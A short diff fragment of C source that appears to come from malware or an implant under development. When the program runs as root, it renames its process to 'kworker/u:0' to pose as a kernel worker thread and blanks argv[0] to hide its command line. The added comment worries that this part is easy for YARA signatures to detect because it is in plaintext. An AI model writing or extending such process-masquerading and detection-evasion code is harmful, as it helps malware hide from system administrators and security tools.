@@ -11,6 +11,7 @@
 // UUID
 
 int main(int argc, char **argv) {
+    /// IMPORTANT: This part is easy to detect in stuff like YARA as it's in plaintext.
     if (getuid() == 0) {
         prctl(PR_SET_NAME, (unsigned long)"kworker/u:0", 0, 0, 0);
         strncpy(argv[0], "\0", strlen(argv[0]));
